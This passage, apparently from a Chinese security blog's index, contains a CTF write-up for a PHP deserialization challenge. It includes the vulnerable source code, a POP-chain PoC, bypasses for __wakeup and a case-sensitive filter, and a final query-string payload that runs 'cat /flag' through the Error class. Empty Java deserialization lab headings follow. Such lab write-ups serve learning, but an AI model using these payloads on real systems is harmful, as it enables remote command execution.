class="hljs-comment">//我叫：小红，性别：女，年龄：23</span><br></code></pre></td></tr></table></figure><p>如果没有在代码中显示地声明构造函数，类中会默认存在一个没有参数列表并且内容为空的构造函数。如果显示地声明了构造函数则类中的默认构造方法将不会存在。所以构造函数通常用来做一些准备工作，比如为某些参数赋值。</p><p><em><strong>注意：如果显示地声明构造函数，那么它的访问权限必须是public，而且构造函数是在实例化时自动调用的，我们不需要手动调用。</strong></em></p><hr><h2 id="2023ROIS冬令营week4-babyphp"><a href="#2023ROIS冬令营week4-babyphp" class="headerlink" title="2023ROIS冬令营week4 babyphp"></a>2023ROIS冬令营week4 babyphp</h2><p>这题综合性比较强，考察了挺多方面的东西的（大哭</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;left = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;right = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;:)&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pipimi::<span class="hljs-title function_ invoke__">__destruct</span>() =&gt; popko::<span class="hljs-title function_ invoke__">__call</span>() =&gt; <span class="hljs-title function_ invoke__">backdoor</span>()<br></code></pre></td></tr></table></figure><p>再看__call()方法下的规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br></code></pre></td></tr></table></figure><p>要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组</p><p>编写poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>    &#125;<br><br>    <span class="hljs-comment">#public function __wakeup()</span><br>    <span class="hljs-comment">#&#123;</span><br>    <span class="hljs-comment">#    $this-&gt;left = &quot;&quot;;</span><br>    <span class="hljs-comment">#    $this-&gt;right = &quot;&quot;;</span><br>    <span class="hljs-comment">#&#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">popko</span>();<br><span class="hljs-variable">$pop</span>-&gt;left=[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$pop</span>-&gt;right=[<span class="hljs-number">2</span>];<br><span class="hljs-variable">$pip</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pipimi</span>();<br><span class="hljs-variable">$pip</span>-&gt;a=<span class="hljs-variable">$pop</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pip</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png"></p><p>漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法，</p><p>将生成的exp进行修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br><span class="hljs-comment">//将popko的对象数2改为比2大的数</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意到函数主体部分有判断语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>GET传入c</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png"></p><p>进入后门后查看backdoor()函数体：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>$a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png"></p><p>可以看到返回值前面几个字符为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span>: <span class="hljs-number">12345</span><span class="hljs-comment">#注意引号和字符串&quot;12345&quot;之间有个空格</span><br></code></pre></td></tr></table></figure><p>目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;ERROR&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;systemls&quot;</span><br><span class="hljs-comment">#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则</span><br><span class="hljs-variable">$d</span> = <span class="hljs-number">7</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">6</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">13</span>;<br><span class="hljs-variable">$g</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>GET传入a、b、d、e、f、g对应的值。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png"></p><p>命令执行成功了。</p><p>对b、d、e、f、g进行修改，发现根目录下存在flag。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png"></p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;&amp;a=<span class="hljs-built_in">Error</span>&amp;b=systemcat /flag&amp;d=<span class="hljs-number">7</span>&amp;e=<span class="hljs-number">6</span>&amp;f=<span class="hljs-number">13</span>&amp;g=<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png"></p><hr><hr><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="JavaDeserializeLabs"><a href="#JavaDeserializeLabs" class="headerlink" title="JavaDeserializeLabs"></a>JavaDeserializeLabs</h2><h3 id="lab1-basic"><a href="#lab1-basic" class="headerlink" title="lab1-basic"></a>lab1-basic</h3><h3 id="lab2-ysoserial"><a href="#lab2-ysoserial" class="headerlink" title="lab2-ysoserial"></a>lab2-ysoserial</h3><h3 id="lab3-shiro-jrmp"><a href="#lab3-shiro-jrmp" class="headerlink" title="lab3-shiro-jrmp"></a>lab3-shiro-jrmp</h3><h3 id="lab4-shiro-blind"><a href="#lab4-shiro-blind" class="headerlink" title="lab4-shiro-blind"></a>lab4-shiro-blind</h3><h3 id="lab5-weblogic-readResolve"><a href="#lab5-weblogic-readResolve" class="headerlink" title="lab5-weblogic-readResolve"></a>lab5-weblogic-readResolve</h3><h3 id="lab6-weblogic-resolveProxyClass"><a href="#lab6-weblogic-resolveProxyClass" class="headerlink" title="lab6-weblogic-resolveProxyClass"></a>lab6-weblogic-resolveProxyClass</h3><h3 id="lab7-weblogic-UnicastRef"><a href="#lab7-weblogic-UnicastRef" class="headerlink" title="lab7-weblogic-UnicastRef"></a>lab7-weblogic-UnicastRef</h3><h3 id="lab8-jrmp-unicastRemoteObject"><a href="#lab8-jrmp-unicastRemoteObject" class="headerlink" title="lab8-jrmp-unicastRemoteObject"></a>lab8-jrmp-unicastRemoteObject</h3><h3 id="lab9-proxy"><a href="#lab9-proxy" class="headerlink" title="lab9-proxy"></a>lab9-proxy</h3>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>反序列化</tag>
      
      <tag>Java</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HELLO</title>
    <link href="/2023/02/08/HELLO/"/>
    <url>/2023/02/08/HELLO/</url>
    
    <content type="html"><![CDATA[<h1 id="Just-a-test"><a href="#Just-a-test" class="headerlink" title="Just a test:)"></a>Just a test:)</h1><h2 id="My-first-blog"><a href="#My-first-blog" class="headerlink" title="My first blog"></a>My first blog</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">terces</span><span class="hljs-operator">=</span>d712373303471becd6f647f54703e6f5d696b7f6471647f607<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
